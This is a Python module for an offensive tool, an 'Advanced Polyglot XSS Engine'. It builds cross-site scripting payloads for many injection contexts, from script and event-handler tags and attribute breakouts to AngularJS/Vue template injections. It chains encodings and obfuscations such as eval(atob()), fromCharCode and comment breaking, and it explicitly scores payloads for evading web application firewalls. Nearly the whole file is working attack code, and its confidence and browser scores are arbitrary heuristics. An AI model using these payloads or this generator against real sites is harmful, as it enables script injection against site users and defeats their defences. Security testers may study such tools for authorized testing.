"""
Module 6: Advanced Polyglot XSS Engine

This module provides sophisticated polyglot payload generation that works across
multiple injection contexts, browsers, and security filters:
- Context-aware polyglot construction
- Multi-browser compatibility testing
- Advanced encoding and obfuscation chains
- WAF evasion technique combinations
- Payload optimization and minimization

The engine generates payloads that maximize success across diverse environments
while maintaining effectiveness and stealth characteristics.
"""

import re
import random
import base64
import urllib.parse
import html
import json
from typing import List, Dict, Set, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import itertools
import string
import logging

logger = logging.getLogger(__name__)


class PolyglotContext(Enum):
    """Contexts where polyglot payloads need to work"""
    HTML_CONTENT = "html_content"                    # <div>PAYLOAD</div>
    HTML_ATTRIBUTE = "html_attribute"                # <div attr="PAYLOAD">
    HTML_ATTRIBUTE_UNQUOTED = "html_attribute_unq"   # <div attr=PAYLOAD>
    JAVASCRIPT_STRING_SINGLE = "js_string_single"    # var x = 'PAYLOAD';
    JAVASCRIPT_STRING_DOUBLE = "js_string_double"    # var x = "PAYLOAD";
    JAVASCRIPT_TEMPLATE = "js_template"              # var x = `PAYLOAD`;
    JAVASCRIPT_VARIABLE = "js_variable"              # var PAYLOAD = value;
    JAVASCRIPT_COMMENT = "js_comment"                # // PAYLOAD or /* PAYLOAD */
    CSS_PROPERTY = "css_property"                    # style="color: PAYLOAD"
    CSS_SELECTOR = "css_selector"                    # PAYLOAD { color: red; }
    CSS_COMMENT = "css_comment"                      # /* PAYLOAD */
    URL_PARAMETER = "url_parameter"                  # ?param=PAYLOAD
    URL_PATH = "url_path"                           # /path/PAYLOAD
    URL_FRAGMENT = "url_fragment"                   # #PAYLOAD
    JSON_VALUE = "json_value"                       # {"key": "PAYLOAD"}
    XML_CONTENT = "xml_content"                     # <node>PAYLOAD</node>
    XML_ATTRIBUTE = "xml_attribute"                 # <node attr="PAYLOAD">
    SQL_STRING = "sql_string"                       # WHERE name = 'PAYLOAD'
    COMMAND_LINE = "command_line"                   # command PAYLOAD


class EncodingTechnique(Enum):
    """Encoding techniques for payload obfuscation"""
    NONE = "none"                                   # No encoding
    HTML_ENTITIES = "html_entities"                 # &lt; &gt; &quot;
    URL_ENCODING = "url_encoding"                   # %3C %3E %22
    DOUBLE_URL_ENCODING = "double_url_encoding"     # %253C %253E %2522
    UNICODE_ENCODING = "unicode_encoding"           # \u003c \u003e \u0022
    HEX_ENCODING = "hex_encoding"                   # \x3c \x3e \x22
    BASE64_ENCODING = "base64_encoding"             # Base64 encoded content
    DECIMAL_ENCODING = "decimal_encoding"           # &#60; &#62; &#34;
    OCTAL_ENCODING = "octal_encoding"               # \074 \076 \042
    MIXED_CASE = "mixed_case"                       # ScRiPt AlErT
    COMMENT_BREAKING = "comment_breaking"           # scr<!---->ipt


class ObfuscationTechnique(Enum):
    """Advanced obfuscation techniques"""
    STRING_CONCATENATION = "string_concat"          # 'ale'+'rt'
    FROMCHARCODE = "fromcharcode"                   # String.fromCharCode(97,108,101,114,116)
    EVAL_DECODE = "eval_decode"                     # eval(atob('YWxlcnQ='))
    WHITESPACE_VARIATION = "whitespace_var"         # Various whitespace characters
    BRACKET_NOTATION = "bracket_notation"           # window['alert']
    PROPERTY_ACCESS = "property_access"             # window.alert vs window['alert']
    MATHEMATICAL_OPERATIONS = "math_ops"            # (1+1+'')*3+'alert'
    REGEX_ABUSE = "regex_abuse"                     # /alert/.source
    TEMPLATE_LITERALS = "template_literals"         # `ale${'rt'}`
    CONSTRUCTOR_CHAINING = "constructor_chain"      # [].constructor.constructor


@dataclass
class PolyglotComponent:
    """Component of a polyglot payload"""
    content: str                                    # The actual content
    contexts: Set[PolyglotContext]                 # Contexts where this works
    priority: int                                  # Priority for inclusion (1-10)
    encoding_safe: bool = True                     # Safe to encode further
    comment_safe: bool = True                      # Safe to wrap in comments
    quote_safe: bool = True                        # Safe to wrap in quotes


@dataclass
class PolyglotPayload:
    """Generated polyglot payload with metadata"""
    payload: str                                   # The complete payload
    contexts: Set[PolyglotContext]                # Contexts where it should work
    confidence: float                             # Expected success rate (0.0-1.0)
    length: int                                   # Payload length in characters
    complexity_score: float                       # Complexity rating (0.0-10.0)
    encodings_used: List[EncodingTechnique]       # Encoding techniques applied
    obfuscations_used: List[ObfuscationTechnique] # Obfuscation techniques applied
    components: List[PolyglotComponent]           # Components that make up the payload
    browser_compatibility: Dict[str, float]      # Per-browser success probability
    waf_evasion_score: float                     # WAF evasion effectiveness (0.0-1.0)


class AdvancedPolyglotEngine:
    """
    Advanced engine for generating sophisticated polyglot XSS payloads.
    
    This engine creates payloads that work across multiple injection contexts,
    browsers, and security filters by combining various encoding and obfuscation
    techniques in optimal ways.
    
    Features:
    - Multi-context polyglot generation
    - Browser-specific optimization
    - Advanced encoding chain combinations
    - WAF evasion technique integration
    - Payload length optimization
    - Success probability calculation
    
    Example:
        engine = AdvancedPolyglotEngine()
        contexts = {PolyglotContext.HTML_CONTENT, PolyglotContext.HTML_ATTRIBUTE}
        payloads = engine.generate_polyglots(contexts, max_length=200)
        best_payload = max(payloads, key=lambda p: p.confidence)
    """
    
    def __init__(self):
        # Initialize payload components for different contexts
        self.base_components = self._initialize_base_components()
        
        # Browser-specific payload variations
        self.browser_specific = {
            'chrome': {
                'version_specific': ['details', 'summary', 'dialog'],
                'quirks': ['blink_specific_events'],
            },
            'firefox': {
                'version_specific': ['xul', 'browser'],
                'quirks': ['gecko_specific_events'],
            },
            'safari': {
                'version_specific': ['webkit'],
                'quirks': ['webkit_specific_events'],
            },
            'ie': {
                'version_specific': ['vml', 'htc'],
                'quirks': ['activex_objects'],
            },
            'edge': {
                'version_specific': ['ms_specific'],
                'quirks': ['edge_legacy_quirks'],
            }
        }
        
        # Encoding chain combinations that work well together
        self.encoding_chains = [
            [EncodingTechnique.HTML_ENTITIES, EncodingTechnique.URL_ENCODING],
            [EncodingTechnique.UNICODE_ENCODING, EncodingTechnique.URL_ENCODING],
            [EncodingTechnique.DOUBLE_URL_ENCODING],
            [EncodingTechnique.BASE64_ENCODING, EncodingTechnique.URL_ENCODING],
            [EncodingTechnique.DECIMAL_ENCODING, EncodingTechnique.HEX_ENCODING],
            [EncodingTechnique.MIXED_CASE, EncodingTechnique.COMMENT_BREAKING],
        ]
        
        # Obfuscation technique combinations
        self.obfuscation_chains = [
            [ObfuscationTechnique.STRING_CONCATENATION, ObfuscationTechnique.BRACKET_NOTATION],
            [ObfuscationTechnique.FROMCHARCODE, ObfuscationTechnique.EVAL_DECODE],
            [ObfuscationTechnique.TEMPLATE_LITERALS, ObfuscationTechnique.MATHEMATICAL_OPERATIONS],
            [ObfuscationTechnique.CONSTRUCTOR_CHAINING, ObfuscationTechnique.PROPERTY_ACCESS],
            [ObfuscationTechnique.REGEX_ABUSE, ObfuscationTechnique.WHITESPACE_VARIATION],
        ]
        
        # WAF signature patterns to avoid
        self.waf_signatures = {
            'script': ['<script', 'script>', '</script>'],
            'javascript': ['javascript:', 'vbscript:', 'data:'],
            'events': ['onload', 'onerror', 'onclick', 'onmouseover'],
            'functions': ['alert', 'confirm', 'prompt', 'eval'],
            'keywords': ['expression', 'behavior', 'binding'],
        }
        
        # Context-specific escape sequences
        self.context_escapes = {
            PolyglotContext.HTML_ATTRIBUTE: ['"', "'", '>'],
            PolyglotContext.JAVASCRIPT_STRING_SINGLE: ["'", '\\', '\n'],
            PolyglotContext.JAVASCRIPT_STRING_DOUBLE: ['"', '\\', '\n'],
            PolyglotContext.CSS_PROPERTY: [';', '}', '/*', '*/'],
            PolyglotContext.URL_PARAMETER: ['&', '#', '?', '='],
            PolyglotContext.JSON_VALUE: ['"', '\\', '\n', '}'],
        }
    
    def _initialize_base_components(self) -> List[PolyglotComponent]:
        """Initialize the base components for polyglot construction"""
        components = []
        
        # Universal script execution components
        components.extend([
            # Basic script tag variations
            PolyglotComponent(
                content='<script>alert(1)</script>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=10
            ),
            PolyglotComponent(
                content='<img src=x onerror=alert(1)>',
                contexts={PolyglotContext.HTML_CONTENT, PolyglotContext.HTML_ATTRIBUTE_UNQUOTED},
                priority=9
            ),
            PolyglotComponent(
                content='<svg onload=alert(1)>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=8
            ),
            
            # Attribute breaking components
            PolyglotComponent(
                content='" onmouseover=alert(1) "',
                contexts={PolyglotContext.HTML_ATTRIBUTE},
                priority=8
            ),
            PolyglotComponent(
                content="' onclick=alert(1) '",
                contexts={PolyglotContext.HTML_ATTRIBUTE},
                priority=8
            ),
            
            # JavaScript context components
            PolyglotComponent(
                content="';alert(1);//",
                contexts={PolyglotContext.JAVASCRIPT_STRING_SINGLE},
                priority=9
            ),
            PolyglotComponent(
                content='";alert(1);//',
                contexts={PolyglotContext.JAVASCRIPT_STRING_DOUBLE},
                priority=9
            ),
            PolyglotComponent(
                content='`);alert(1);//',
                contexts={PolyglotContext.JAVASCRIPT_TEMPLATE},
                priority=7
            ),
            
            # URL context components
            PolyglotComponent(
                content='javascript:alert(1)',
                contexts={PolyglotContext.URL_PARAMETER, PolyglotContext.URL_PATH},
                priority=7
            ),
            
            # CSS context components
            PolyglotComponent(
                content='expression(alert(1))',
                contexts={PolyglotContext.CSS_PROPERTY},
                priority=6,
                comment_safe=False  # CSS expressions don't work with comments
            ),
            PolyglotComponent(
                content='}body{background:url("javascript:alert(1)")',
                contexts={PolyglotContext.CSS_PROPERTY},
                priority=6
            ),
            
            # Multi-context breaking components
            PolyglotComponent(
                content='</script><img src=x onerror=alert(1)>',
                contexts={PolyglotContext.JAVASCRIPT_STRING_SINGLE, PolyglotContext.JAVASCRIPT_STRING_DOUBLE, PolyglotContext.HTML_CONTENT},
                priority=8
            ),
            PolyglotComponent(
                content='--></script><svg onload=alert(1)><!--',
                contexts={PolyglotContext.HTML_CONTENT, PolyglotContext.CSS_COMMENT, PolyglotContext.JAVASCRIPT_COMMENT},
                priority=7
            ),
        ])
        
        # Advanced HTML5 components
        components.extend([
            PolyglotComponent(
                content='<details open ontoggle=alert(1)>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=7
            ),
            PolyglotComponent(
                content='<video><source onerror="alert(1)">',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=6
            ),
            PolyglotComponent(
                content='<audio src=x onerror=alert(1)>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=6
            ),
            PolyglotComponent(
                content='<input autofocus onfocus=alert(1)>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=6
            ),
            PolyglotComponent(
                content='<select onfocus=alert(1) autofocus>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=5
            ),
        ])
        
        # Framework-specific components
        components.extend([
            # AngularJS
            PolyglotComponent(
                content='{{constructor.constructor("alert(1)")()}}',
                contexts={PolyglotContext.HTML_CONTENT, PolyglotContext.HTML_ATTRIBUTE},
                priority=6
            ),
            # Vue.js
            PolyglotComponent(
                content='{{$root.constructor.constructor("alert(1)")()}}',
                contexts={PolyglotContext.HTML_CONTENT, PolyglotContext.HTML_ATTRIBUTE},
                priority=5
            ),
        ])
        
        return components
    
    def generate_polyglots(self, target_contexts: Set[PolyglotContext], 
                          max_length: int = 500,
                          max_payloads: int = 10,
                          include_obfuscation: bool = True,
                          target_browsers: Optional[List[str]] = None) -> List[PolyglotPayload]:
        """
        Generate polyglot payloads for specified contexts.
        
        Args:
            target_contexts: Set of contexts the payload should work in
            max_length: Maximum payload length in characters
            max_payloads: Maximum number of payloads to generate
            include_obfuscation: Whether to apply obfuscation techniques
            target_browsers: Specific browsers to optimize for
            
        Returns:
            List of generated polyglot payloads sorted by confidence
        """
        logger.info(f"Generating polyglots for {len(target_contexts)} contexts")
        
        payloads = []
        
        # Generate basic polyglots by combining components
        basic_polyglots = self._generate_basic_polyglots(target_contexts, max_length)
        payloads.extend(basic_polyglots)
        
        # Generate encoded variants
        encoded_polyglots = self._generate_encoded_polyglots(basic_polyglots, max_length)
        payloads.extend(encoded_polyglots)
        
        # Generate obfuscated variants if requested
        if include_obfuscation:
            obfuscated_polyglots = self._generate_obfuscated_polyglots(basic_polyglots, max_length)
            payloads.extend(obfuscated_polyglots)
        
        # Generate browser-specific variants
        if target_browsers:
            browser_polyglots = self._generate_browser_specific_polyglots(
                basic_polyglots, target_browsers, max_length
            )
            payloads.extend(browser_polyglots)
        
        # Calculate confidence scores and browser compatibility
        for payload in payloads:
            payload.confidence = self._calculate_confidence(payload, target_contexts)
            payload.browser_compatibility = self._calculate_browser_compatibility(payload)
            payload.waf_evasion_score = self._calculate_waf_evasion_score(payload)
            payload.complexity_score = self._calculate_complexity_score(payload)
        
        # Sort by confidence and return top results
        payloads.sort(key=lambda p: p.confidence, reverse=True)
        return payloads[:max_payloads]
    
    def _generate_basic_polyglots(self, target_contexts: Set[PolyglotContext], 
                                max_length: int) -> List[PolyglotPayload]:
        """Generate basic polyglot payloads by combining components"""
        polyglots = []
        
        # Find components that work in target contexts
        suitable_components = []
        for component in self.base_components:
            if component.contexts.intersection(target_contexts):
                suitable_components.append(component)
        
        # Sort by priority and context coverage
        suitable_components.sort(key=lambda c: (c.priority, len(c.contexts.intersection(target_contexts))), reverse=True)
        
        # Generate combinations of components
        for num_components in range(1, min(4, len(suitable_components) + 1)):
            for component_combo in itertools.combinations(suitable_components[:8], num_components):
                # Combine components into a single payload
                combined_payload = self._combine_components(component_combo)
                
                if len(combined_payload) <= max_length:
                    # Calculate which contexts this combination covers
                    covered_contexts = set()
                    for component in component_combo:
                        covered_contexts.update(component.contexts)
                    
                    polyglot = PolyglotPayload(
                        payload=combined_payload,
                        contexts=covered_contexts,
                        confidence=0.0,  # Will be calculated later
                        length=len(combined_payload),
                        complexity_score=0.0,  # Will be calculated later
                        encodings_used=[],
                        obfuscations_used=[],
                        components=list(component_combo),
                        browser_compatibility={},
                        waf_evasion_score=0.0
                    )
                    polyglots.append(polyglot)
        
        return polyglots
    
    def _combine_components(self, components: Tuple[PolyglotComponent, ...]) -> str:
        """Combine multiple components into a single polyglot payload"""
        if len(components) == 1:
            return components[0].content
        
        # Strategy: Use comment breaking and context switching to combine components
        combined = ""
        
        # Sort components by priority
        sorted_components = sorted(components, key=lambda c: c.priority, reverse=True)
        
        for i, component in enumerate(sorted_components):
            if i == 0:
                # First component goes as-is
                combined += component.content
            else:
                # Add context breaking and the next component
                if component.comment_safe:
                    # Use comment breaking
                    combined += f"/*{component.content}*/"
                else:
                    # Use various separators
                    separators = ["", "<!--", "*/", "-->", "//"]
                    separator = random.choice(separators)
                    combined += separator + component.content
        
        # Add universal polyglot patterns for better context coverage
        universal_patterns = [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
            '"-alert(1)-"',
            '\'"--></style></script><svg onload=alert()>',
        ]
        
        # Occasionally include a universal pattern
        if random.random() > 0.7 and len(combined) < 300:
            pattern = random.choice(universal_patterns)
            combined = pattern + combined
        
        return combined
    
    def _generate_encoded_polyglots(self, base_polyglots: List[PolyglotPayload], 
                                  max_length: int) -> List[PolyglotPayload]:
        """Generate encoded variants of base polyglots"""
        encoded_polyglots = []
        
        for base_payload in base_polyglots:
            # Try different encoding chains
            for encoding_chain in self.encoding_chains:
                encoded_content = base_payload.payload
                used_encodings = []
                
                # Apply encoding chain
                for encoding in encoding_chain:
                    new_content = self._apply_encoding(encoded_content, encoding)
                    if len(new_content) <= max_length:
                        encoded_content = new_content
                        used_encodings.append(encoding)
                    else:
                        break  # Stop if too long
                
                if used_encodings and encoded_content != base_payload.payload:
                    # Create new polyglot with encoding
                    encoded_polyglot = PolyglotPayload(
                        payload=encoded_content,
                        contexts=base_payload.contexts.copy(),
                        confidence=0.0,
                        length=len(encoded_content),
                        complexity_score=0.0,
                        encodings_used=used_encodings,
                        obfuscations_used=[],
                        components=base_payload.components.copy(),
                        browser_compatibility={},
                        waf_evasion_score=0.0
                    )
                    encoded_polyglots.append(encoded_polyglot)
        
        return encoded_polyglots
    
    def _generate_obfuscated_polyglots(self, base_polyglots: List[PolyglotPayload], 
                                     max_length: int) -> List[PolyglotPayload]:
        """Generate obfuscated variants of base polyglots"""
        obfuscated_polyglots = []
        
        for base_payload in base_polyglots:
            # Try different obfuscation chains
            for obfuscation_chain in self.obfuscation_chains[:3]:  # Limit to first 3 chains
                obfuscated_content = base_payload.payload
                used_obfuscations = []
                
                # Apply obfuscation chain
                for obfuscation in obfuscation_chain:
                    new_content = self._apply_obfuscation(obfuscated_content, obfuscation)
                    if len(new_content) <= max_length:
                        obfuscated_content = new_content
                        used_obfuscations.append(obfuscation)
                    else:
                        break  # Stop if too long
                
                if used_obfuscations and obfuscated_content != base_payload.payload:
                    # Create new polyglot with obfuscation
                    obfuscated_polyglot = PolyglotPayload(
                        payload=obfuscated_content,
                        contexts=base_payload.contexts.copy(),
                        confidence=0.0,
                        length=len(obfuscated_content),
                        complexity_score=0.0,
                        encodings_used=base_payload.encodings_used.copy(),
                        obfuscations_used=used_obfuscations,
                        components=base_payload.components.copy(),
                        browser_compatibility={},
                        waf_evasion_score=0.0
                    )
                    obfuscated_polyglots.append(obfuscated_polyglot)
        
        return obfuscated_polyglots
    
    def _generate_browser_specific_polyglots(self, base_polyglots: List[PolyglotPayload], 
                                           target_browsers: List[str], 
                                           max_length: int) -> List[PolyglotPayload]:
        """Generate browser-specific optimized polyglots"""
        browser_polyglots = []
        
        # Browser-specific payload modifications
        browser_modifications = {
            'chrome': {
                'prefixes': ['<details open ontoggle=', '<dialog onclose='],
                'suffixes': ['>'],
            },
            'firefox': {
                'prefixes': ['<xul:script>', '<browser onload='],
                'suffixes': ['</xul:script>', '>'],
            },
            'safari': {
                'prefixes': ['<webkit>', '<video autoplay oncanplay='],
                'suffixes': ['</webkit>', '>'],
            },
            'ie': {
                'prefixes': ['<xml>', '<object data="javascript:'],
                'suffixes': ['</xml>', '">'],
            }
        }
        
        for base_payload in base_polyglots[:3]:  # Only modify first 3 base payloads
            for browser in target_browsers:
                if browser in browser_modifications:
                    mods = browser_modifications[browser]
                    
                    for prefix, suffix in zip(mods['prefixes'], mods['suffixes']):
                        modified_payload = f"{prefix}{base_payload.payload}{suffix}"
                        
                        if len(modified_payload) <= max_length:
                            browser_polyglot = PolyglotPayload(
                                payload=modified_payload,
                                contexts=base_payload.contexts.copy(),
                                confidence=0.0,
                                length=len(modified_payload),
                                complexity_score=0.0,
                                encodings_used=base_payload.encodings_used.copy(),
                                obfuscations_used=base_payload.obfuscations_used.copy(),
                                components=base_payload.components.copy(),
                                browser_compatibility={browser: 0.9},  # High compatibility with target browser
                                waf_evasion_score=0.0
                            )
                            browser_polyglots.append(browser_polyglot)
        
        return browser_polyglots
    
    def _apply_encoding(self, content: str, encoding: EncodingTechnique) -> str:
        """Apply specific encoding technique to content"""
        if encoding == EncodingTechnique.HTML_ENTITIES:
            # Encode critical characters as HTML entities
            replacements = {'<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '&': '&amp;'}
            for char, entity in replacements.items():
                content = content.replace(char, entity)
        
        elif encoding == EncodingTechnique.URL_ENCODING:
            # URL encode special characters
            content = urllib.parse.quote(content, safe='')
        
        elif encoding == EncodingTechnique.DOUBLE_URL_ENCODING:
            # Apply URL encoding twice
            content = urllib.parse.quote(urllib.parse.quote(content, safe=''), safe='')
        
        elif encoding == EncodingTechnique.UNICODE_ENCODING:
            # Unicode escape sequence encoding
            encoded = ""
            for char in content:
                if ord(char) > 127 or char in '<>"\'&':
                    encoded += f"\\u{ord(char):04x}"
                else:
                    encoded += char
            content = encoded
        
        elif encoding == EncodingTechnique.HEX_ENCODING:
            # Hex escape sequence encoding
            encoded = ""
            for char in content:
                if char in '<>"\'&':
                    encoded += f"\\x{ord(char):02x}"
                else:
                    encoded += char
            content = encoded
        
        elif encoding == EncodingTechnique.BASE64_ENCODING:
            # Base64 encode and wrap in eval(atob())
            encoded = base64.b64encode(content.encode()).decode()
            content = f"eval(atob('{encoded}'))"
        
        elif encoding == EncodingTechnique.DECIMAL_ENCODING:
            # Decimal HTML entity encoding
            encoded = ""
            for char in content:
                if char in '<>"\'&':
                    encoded += f"&#{ord(char)};"
                else:
                    encoded += char
            content = encoded
        
        elif encoding == EncodingTechnique.MIXED_CASE:
            # Random case variation
            encoded = ""
            for char in content:
                if char.isalpha():
                    encoded += char.upper() if random.random() > 0.5 else char.lower()
                else:
                    encoded += char
            content = encoded
        
        elif encoding == EncodingTechnique.COMMENT_BREAKING:
            # Insert HTML comments to break up keywords
            keywords = ['script', 'alert', 'javascript', 'eval']
            for keyword in keywords:
                if keyword in content.lower():
                    # Insert comment in middle of keyword
                    mid = len(keyword) // 2
                    new_keyword = keyword[:mid] + '<!---->' + keyword[mid:]
                    content = re.sub(re.escape(keyword), new_keyword, content, flags=re.IGNORECASE)
        
        return content
    
    def _apply_obfuscation(self, content: str, obfuscation: ObfuscationTechnique) -> str:
        """Apply specific obfuscation technique to content"""
        if obfuscation == ObfuscationTechnique.STRING_CONCATENATION:
            # Break strings into concatenated parts
            if 'alert' in content:
                content = content.replace('alert', "'ale'+'rt'")
            if 'script' in content:
                content = content.replace('script', "'scr'+'ipt'")
        
        elif obfuscation == ObfuscationTechnique.FROMCHARCODE:
            # Convert strings to String.fromCharCode
            if 'alert' in content:
                char_codes = ','.join(str(ord(c)) for c in 'alert')
                content = content.replace('alert', f'String.fromCharCode({char_codes})')
        
        elif obfuscation == ObfuscationTechnique.EVAL_DECODE:
            # Wrap in eval with encoding
            if len(content) < 100:  # Only for shorter payloads
                encoded = base64.b64encode(content.encode()).decode()
                content = f'eval(atob("{encoded}"))'
        
        elif obfuscation == ObfuscationTechnique.WHITESPACE_VARIATION:
            # Use various whitespace characters
            whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
            for i, char in enumerate(content):
                if char == ' ' and random.random() > 0.7:
                    content = content[:i] + random.choice(whitespace_chars) + content[i+1:]
        
        elif obfuscation == ObfuscationTechnique.BRACKET_NOTATION:
            # Convert dot notation to bracket notation
            content = re.sub(r'window\.(\w+)', r"window['\1']", content)
            content = re.sub(r'document\.(\w+)', r"document['\1']", content)
        
        elif obfuscation == ObfuscationTechnique.TEMPLATE_LITERALS:
            # Use template literals with expressions
            if 'alert' in content:
                content = content.replace('alert', '`ale${"rt"}`')
        
        elif obfuscation == ObfuscationTechnique.MATHEMATICAL_OPERATIONS:
            # Use mathematical operations to construct strings
            if '1' in content:
                content = content.replace('1', '(1+0)')
        
        elif obfuscation == ObfuscationTechnique.CONSTRUCTOR_CHAINING:
            # Use constructor chaining for function access
            if 'alert' in content:
                content = content.replace('alert', '[].constructor.constructor("alert")')
        
        return content
    
    def _calculate_confidence(self, payload: PolyglotPayload, 
                            target_contexts: Set[PolyglotContext]) -> float:
        """Calculate confidence score for payload success"""
        confidence = 0.5  # Base confidence
        
        # Context coverage bonus
        covered_contexts = payload.contexts.intersection(target_contexts)
        coverage_ratio = len(covered_contexts) / len(target_contexts) if target_contexts else 0
        confidence += coverage_ratio * 0.3
        
        # Component priority bonus
        total_priority = sum(comp.priority for comp in payload.components)
        avg_priority = total_priority / len(payload.components) if payload.components else 0
        confidence += (avg_priority / 10) * 0.2
        
        # Length penalty (shorter payloads often work better)
        if payload.length < 100:
            confidence += 0.1
        elif payload.length > 300:
            confidence -= 0.1
        
        # Encoding/obfuscation adjustments
        if payload.encodings_used:
            confidence -= len(payload.encodings_used) * 0.05  # Slight penalty for complexity
        if payload.obfuscations_used:
            confidence += len(payload.obfuscations_used) * 0.03  # Bonus for evasion
        
        return min(1.0, max(0.0, confidence))
    
    def _calculate_browser_compatibility(self, payload: PolyglotPayload) -> Dict[str, float]:
        """Calculate per-browser compatibility scores"""
        compatibility = {}
        
        # Base compatibility for all browsers
        base_score = 0.7
        
        # Browser-specific adjustments
        browsers = ['chrome', 'firefox', 'safari', 'ie', 'edge']
        
        for browser in browsers:
            score = base_score
            
            # Adjust based on payload features
            if '<script>' in payload.payload:
                score += 0.2  # Scripts work well in all browsers
            
            if 'onerror=' in payload.payload:
                score += 0.15  # Event handlers are widely supported
            
            if 'javascript:' in payload.payload:
                if browser == 'ie':
                    score += 0.1  # IE historically good with javascript: URLs
                else:
                    score -= 0.05  # Modern browsers more restrictive
            
            # HTML5 features
            if any(tag in payload.payload for tag in ['<details>', '<video>', '<audio>']):
                if browser in ['chrome', 'firefox', 'safari']:
                    score += 0.1  # Good HTML5 support
                elif browser == 'ie':
                    score -= 0.2  # Poor HTML5 support
            
            # Framework-specific
            if '{{' in payload.payload:  # AngularJS/Vue patterns
                score += 0.05  # Framework exploitation
            
            compatibility[browser] = min(1.0, max(0.0, score))
        
        return compatibility
    
    def _calculate_waf_evasion_score(self, payload: PolyglotPayload) -> float:
        """Calculate WAF evasion effectiveness score"""
        score = 0.5  # Base evasion score
        
        # Check for common WAF signatures
        signature_penalties = 0
        for category, signatures in self.waf_signatures.items():
            for signature in signatures:
                if signature.lower() in payload.payload.lower():
                    signature_penalties += 1
        
        # Penalty for obvious signatures
        score -= signature_penalties * 0.1
        
        # Bonus for evasion techniques
        if payload.encodings_used:
            score += len(payload.encodings_used) * 0.1
        
        if payload.obfuscations_used:
            score += len(payload.obfuscations_used) * 0.15
        
        # Bonus for comment breaking
        if '<!--' in payload.payload or '/*' in payload.payload:
            score += 0.1
        
        # Bonus for mixed case
        if any(c.isupper() and c.islower() for c in payload.payload if c.isalpha()):
            score += 0.05
        
        return min(1.0, max(0.0, score))
    
    def _calculate_complexity_score(self, payload: PolyglotPayload) -> float:
        """Calculate payload complexity score"""
        score = 0.0
        
        # Length complexity
        score += min(payload.length / 100, 3.0)
        
        # Component complexity
        score += len(payload.components) * 0.5
        
        # Encoding complexity
        score += len(payload.encodings_used) * 0.8
        
        # Obfuscation complexity
        score += len(payload.obfuscations_used) * 1.0
        
        # Context coverage complexity
        score += len(payload.contexts) * 0.3
        
        return min(10.0, score)
    
    def generate_minimal_polyglot(self, target_contexts: Set[PolyglotContext]) -> Optional[PolyglotPayload]:
        """Generate the shortest possible polyglot for target contexts"""
        logger.info("Generating minimal polyglot")
        
        # Start with the most versatile short components
        minimal_components = [
            PolyglotComponent(
                content='"onclick=alert() "',
                contexts={PolyglotContext.HTML_ATTRIBUTE, PolyglotContext.HTML_CONTENT},
                priority=10
            ),
            PolyglotComponent(
                content="';alert();//",
                contexts={PolyglotContext.JAVASCRIPT_STRING_SINGLE, PolyglotContext.JAVASCRIPT_STRING_DOUBLE},
                priority=9
            ),
            PolyglotComponent(
                content='<svg onload=alert()>',
                contexts={PolyglotContext.HTML_CONTENT},
                priority=8
            ),
        ]
        
        # Find the component that covers the most target contexts
        best_component = None
        best_coverage = 0
        
        for component in minimal_components:
            coverage = len(component.contexts.intersection(target_contexts))
            if coverage > best_coverage:
                best_coverage = coverage
                best_component = component
        
        if best_component:
            return PolyglotPayload(
                payload=best_component.content,
                contexts=best_component.contexts,
                confidence=0.8,
                length=len(best_component.content),
                complexity_score=1.0,
                encodings_used=[],
                obfuscations_used=[],
                components=[best_component],
                browser_compatibility=self._calculate_browser_compatibility_minimal(best_component.content),
                waf_evasion_score=0.6
            )
        
        return None
    
    def _calculate_browser_compatibility_minimal(self, payload: str) -> Dict[str, float]:
        """Calculate browser compatibility for minimal payloads"""
        return {browser: 0.8 for browser in ['chrome', 'firefox', 'safari', 'ie', 'edge']}
    
    def generate_polyglot_report(self, payloads: List[PolyglotPayload]) -> str:
        """Generate a comprehensive report for polyglot payloads"""
        report = "Advanced Polyglot XSS Payload Report\n"
        report += "=" * 50 + "\n\n"
        
        if not payloads:
            return report + "No polyglot payloads generated.\n"
        
        report += f"Generated {len(payloads)} polyglot payloads\n"
        report += f"Best confidence: {max(p.confidence for p in payloads):.2f}\n"
        report += f"Average length: {sum(p.length for p in payloads) / len(payloads):.0f} characters\n\n"
        
        # Top payloads
        report += "TOP POLYGLOT PAYLOADS:\n"
        report += "-" * 30 + "\n\n"
        
        for i, payload in enumerate(payloads[:5], 1):
            report += f"[{i}] Confidence: {payload.confidence:.2f} | Length: {payload.length}\n"
            report += f"Payload: {payload.payload}\n"
            report += f"Contexts: {', '.join(ctx.value for ctx in payload.contexts)}\n"
            report += f"WAF Evasion: {payload.waf_evasion_score:.2f}\n"
            report += f"Complexity: {payload.complexity_score:.1f}\n"
            
            if payload.encodings_used:
                report += f"Encodings: {', '.join(enc.value for enc in payload.encodings_used)}\n"
            
            if payload.obfuscations_used:
                report += f"Obfuscations: {', '.join(obf.value for obf in payload.obfuscations_used)}\n"
            
            # Browser compatibility
            best_browsers = sorted(payload.browser_compatibility.items(), 
                                 key=lambda x: x[1], reverse=True)[:3]
            report += f"Best browsers: {', '.join(f'{b}({s:.1f})' for b, s in best_browsers)}\n"
            
            report += "\n" + "-" * 30 + "\n\n"
        
        return report